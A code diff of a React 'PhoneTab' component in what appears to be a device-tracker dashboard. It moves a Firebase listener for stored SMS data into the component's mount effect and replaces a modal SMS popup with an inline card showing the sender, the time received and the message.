@@ -41,7 +41,6 @@ const PhoneTab = () => {
   const [smsNumber, setSmsNumber] = useState("");
   const [smsMessage, setSmsMessage] = useState("");
   const [smsIndex, setSmsIndex] = useState("");
-  const [showSMSDialog, setShowSMSDialog] = useState(false);
 
   const getTimeAgo = (isoString) => {
     if (!isoString) return '--';
@@ -92,9 +91,22 @@ const PhoneTab = () => {
       }
     });
 
+    const smsRef = ref(db, 'Tracker/storedsms');
+    const unsubSMS = onValue(smsRef, (snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        setSMS({
+          number: data.number || "",
+          message: data.message || "",
+          time_sent_human: data.time_sent ? getTimeAgo(data.time_sent) : "--",
+        });
+      }
+    });
+
     return () => {
       unsubContacts();
       unsubStatus();
+      unsubSMS();
     };
   }, []);
 
@@ -109,20 +121,7 @@ const PhoneTab = () => {
         timestamp: new Date().toISOString(),
         pending: true
       });
-      
-      const smsRef = ref(db, 'Tracker/storedsms');
-      const unsubSMS = onValue(smsRef, (snapshot) => {
-        const data = snapshot.val();
-        if (data && data.index === index) {
-          setSMS({
-            number: data.number,
-            message: data.message,
-            time_sent_human: getTimeAgo(data.time_sent),
-          });
-          setShowSMSDialog(true);
-          unsubSMS();
-        }
-      });
+
       toast({
         title: "Request Sent",
         description: "SMS retrieval request sent successfully.",
@@ -559,32 +558,30 @@ const PhoneTab = () => {
             >
               {loading.sms ? "Retrieving..." : "Retrieve SMS"}
             </Button>
+
+            {sms_message.number && (
+              <div className="mt-6 p-4 bg-gray-700 rounded-lg border border-gray-600">
+                <div className="space-y-3">
+                  <div className="flex justify-between items-center border-b border-gray-600 pb-2">
+                    <span className="text-sm text-gray-400">From:</span>
+                    <span className="text-white font-mono">{sms_message.number}</span>
+                  </div>
+                  <div className="flex justify-between items-center border-b border-gray-600 pb-2">
+                    <span className="text-sm text-gray-400">Received:</span>
+                    <span className="text-white text-sm">{sms_message.time_sent_human}</span>
+                  </div>
+                  <div>
+                    <span className="text-sm text-gray-400 block mb-2">Message:</span>
+                    <div className="p-3 bg-gray-800 rounded-lg text-white whitespace-pre-wrap break-words">
+                      {sms_message.message}
+                    </div>
+                  </div>
+                </div>
+              </div>
+            )}
           </CardContent>
         </Card>
       </div>
-      {/* SMS Popup */}
-      {showSMSDialog && (
-        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
-          <div className="bg-gray-900 rounded-xl shadow-xl p-6 max-w-md w-full">
-            <h2 className="text-xl font-bold text-white mb-4">SMS Details</h2>
-            <div className="space-y-2">
-              <p className="text-gray-300"><span className="font-semibold">From:</span> {sms_message.number}</p>
-              <p className="text-gray-300"><span className="font-semibold">Time:</span> {sms_message.time_sent_human}</p>
-              <div className="p-3 bg-gray-800 rounded-lg text-white whitespace-pre-wrap">
-                {sms_message.message}
-              </div>
-            </div>
-            <div className="mt-4 text-right">
-              <Button
-                onClick={() => setShowSMSDialog(false)}
-                className="bg-red-600 hover:bg-red-700 text-white"
-              >
-                Close
-              </Button>
-            </div>
-          </div>
-        </div>
-      )}
     </div>
   );
 };
